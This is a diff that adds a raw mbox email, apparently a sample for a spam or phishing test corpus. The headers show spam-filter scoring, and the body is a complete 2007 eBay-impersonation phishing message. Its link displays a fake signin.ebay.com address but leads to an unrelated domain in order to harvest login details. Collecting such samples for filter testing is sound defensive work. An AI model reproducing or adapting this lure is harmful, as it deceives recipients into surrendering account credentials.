@@ -1,0 +1,141 @@
+From nobody Sun Jan 25 13:50:04 2015
+Return-Path: <will@fileserver1.frontiersman.net>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 5581E46901
+ for <user@login.example.com>; Sat, 23 Jun 2007 02:54:43 -0400 (EDT)
+Received: from lujan.uninet.edu (bio.hgy.es [193.146.180.21])
+ by mail.example.org (Postfix) with ESMTP id 009C3131FC64
+ for <user@example.com>; Sat, 23 Jun 2007 02:54:42 -0400 (EDT)
+Received: by lujan.uninet.edu (Postfix)
+ id 0CE191C3B0; Sat, 23 Jun 2007 08:54:37 +0200 (CEST)
+Delivered-To: umeet@uninet.edu
+Received: from mar.uninet.edu (mar.uninet.edu [193.146.180.108])
+ by lujan.uninet.edu (Postfix) with ESMTP id B5D541C3A4
+ for <umeet@uninet.edu>; Sat, 23 Jun 2007 08:54:36 +0200 (CEST)
+Received: from localhost (localhost [127.0.0.1])
+ by mar.uninet.edu (Postfix) with ESMTP id 978567FF
+ for <umeet@uninet.edu>; Sat, 23 Jun 2007 08:54:36 +0200 (CEST)
+X-Quarantine-ID: <VdTvtqoY18aw>
+X-Virus-Scanned: Debian amavisd-new at uninet.edu
+X-Spam-Flag: YES
+X-Spam-Score: 12.636
+X-Spam-Level: ************
+X-Spam-Status: Yes, score=12.636 tagged_above=0 required=5 tests=[AWL=-4.083, 
+ BAYES_99=3.5, FORGED_RCVD_HELO=0.135, HTML_MESSAGE=0.001,
+ HTML_MIME_NO_HTML_TAG=1.082, MIME_HEADER_CTYPE_ONLY=0,
+ MIME_HTML_ONLY=0.001, RAZOR2_CHECK=12]
+Received: from lujan.uninet.edu ([193.146.180.21])
+ by localhost (mar.uninet.edu [193.146.180.108]) (amavisd-new, port 10024)
+ with ESMTP id VdTvtqoY18aw for <umeet@uninet.edu>;
+ Sat, 23 Jun 2007 08:54:32 +0200 (CEST)
+Received: from fileserver1.frontiersman.net (187-176-58-66.gci.net
+ [66.58.176.187])
+ by lujan.uninet.edu (Postfix) with ESMTP id 7E7011C3A4
+ for <umeet@uninet.edu>; Sat, 23 Jun 2007 08:54:31 +0200 (CEST)
+Received: by fileserver1.frontiersman.net (Postfix, from userid 1036)
+ id 4CB207AB24BB; Fri, 22 Jun 2007 22:31:52 -0800 (AKDT)
+To: umeet@uninet.edu
+Subject: eBay-Security & Resolution center
+Message-ID: <1182580312.71308.qmail@reply3.ebay.com>
+From: "eBayReplay" <eBay-US@reply3.ebay.com>
+Content-Type: text/html
+Date: Fri, 22 Jun 2007 22:31:52 -0800 (AKDT)
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 1435
+
+<P>
+<TABLE cellSpacing=0 cellPadding=5 width="100%" border=0>
+<TBODY>
+<TR>
+<TD noWrap width="1%"><IMG alt=eBay 
+src="http://pics.ebaystatic.com/aw/pics/logos/ebay_95x39.gif" border=0></TD>
+<TD vAlign=bottom><FONT face="verdana, sans-serif" color=#666666><FONT 
+size=1>eBay sent this message to&nbsp;you registered email 
+address.&nbsp;</FONT><A 
+href="http://pages.ebay.com/help/confidence/name-userid-emails.html"><FONT size=1>Learn more</FONT></A><FONT size=1>. </FONT></FONT></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#ffe680 border=0>
+<TBODY>
+<TR>
+<TD vAlign=top width=8><IMG height=8 
+src="http://pics.ebaystatic.com/aw/pics/globalAssets/ltCurve.gif" 
+width=8></TD>
+<TD vAlign=bottom width="100%">
+<H1 style="MARGIN-TOP: 2px; FONT-WEIGHT: bold; FONT-SIZE: 14pt; 
+MARGIN-BOTTOM: 2px; COLOR: #000000; FONT-FAMILY: arial,"><FONT 
+face="Verdana, Helvetica, Arial, sans-serif" size=4><B>Security &amp; 
+Resolution center</B></FONT> </H1></TD>
+<TD vAlign=top align=right width=8><IMG height=8 
+src="http://pics.ebaystatic.com/aw/pics/globalAssets/rtCurve.gif" width=8 
+align=top></TD></TR>
+<TR>
+<TD bgColor=#ffcc00 colSpan=3 height=4><SPACER width="1" type="block" 
+height="4"></SPACER></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><IMG height=5 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD colSpan=2><IMG height=10 
+src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
+<TR>
+<TD vAlign=top align=left width="100%">
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><IMG src="http://pics.ebaystatic.com/aw/pics/s.gif" width=1></TD>
+<TD>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD align=left></TD></TR>
+<TR>
+<TD><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
+<TR>
+<TD vAlign=top align=left width="100%">
+<P><FONT face="Arial, Verdana" size=2></FONT>&nbsp;</P>
+<P><FONT face="Arial, Verdana" size=2>This email was sent automatically 
+by eBay in response to our Fraud Department request to verify your 
+profile. This is done for your protection; only you, the recipient of 
+this email can take the next step . </FONT></P>
+<P><FONT face="Arial, Verdana" size=2>To verify or update 
+your&nbsp;profile and access your account, follow these steps: </FONT></P>
+<P><FONT face="Arial, Verdana" size=2>1. Click on the link 
+below.<BR><BR><A 
+href="http://cavannibox.com/.https/signin.ebay.com/eBayISAPIdllSignInpUserIduseridcopartnerIdsiteid0pageType1883a111UsingSSL1bshowgif0favoritenavhttp3A2F2Fmy.ebay.com2Fws2FeBayISAPIdllFMyeBayppmigrateVisitor1errmsg.htm" target="">https;//signin.ebay.com/ws/eBayISAPI.dll?SignIn&UsingSSL=1&co_partnerid=2&siteid=0&changeUser=0&pUserId=&pNextPage=/a</A></FONT> </P>
+<P><FONT face="Arial, Verdana" size=2>The link will take you to our 
+<STRONG><FONT face="Times New Roman" size=3>Profile 
+Update</FONT></STRONG> page. </FONT></P>
+<P><FONT face="Arial, Verdana" size=2>2. Fill in the appropriate fields 
+to&nbsp;update your&nbsp;profile and click Submit. You will then be able 
+to sell and buy using your eBay account. </FONT></P>
+<P><FONT face="Arial, Verdana" size=2></FONT>&nbsp;</P>
+<P><FONT face="Arial, Verdana" size=2>Thank you,<BR>eBay 
+</FONT></P></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>
+<TD><IMG height=10 src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
+<TR>
+<TD width="100%" bgColor=#ffffff colSpan=2><IMG height=20 
+src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
+<TR>
+<TD width="100%" bgColor=#cecee3 colSpan=2><IMG height=1 
+src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
+<TR>
+<TD width="100%" bgColor=#ffffff colSpan=2><IMG height=10 
+src="http://pics.ebaystatic.com/aw/pics/s.gif"></TD></TR>
+<TR>
+<TD colSpan=2>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD><FONT face="Arial, Verdana" color=#666666 size=1><BR>If you would 
+like to receive this email in text format, change your <A 
+href="http;//cgi4.ebay.com/ws/eBayISAPI.dll?OptinLoginShow">notification 
+preferences</A>. <BR><BR>To contact eBay, please go to: <A 
+href="http;//pages.ebay.com.au/help/contact_inline/index.html">http;//pages.ebay.com.au/help/contact_inline/index.html</A><BR>On the Contact Us page, select the details of your inquiry and click the "Continue" button. Under the heading Contact Support, click the "Email" link and you will be prompted to fill out and send an email. <BR><BR>See our Privacy Policy and User Agreement if you have questions about eBay's communication policies. <BR>Privacy Policy: <A href="http;//pages.ebay.com/help/policies/privacy-policy.html">http;//pages.ebay.com/help/policies/privacy-policy.html</A><BR>User Agreement: <A href="http;//pages.ebay.com/help/policies/user-agreement.html">http;//pages.ebay.com/help/policies/user-agreement.html</A><BR><BR>Copyright ©&nbsp;2007 eBay, Inc. All Rights Reserved.<BR>Designated trademarks and brands are the property of their respective owners.<BR>eBay and the eBay logo are registered trademarks or trademarks of eBay, Inc.<BR></FONT></TD></TR></TBODY></TABLE>
+ </TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></P>
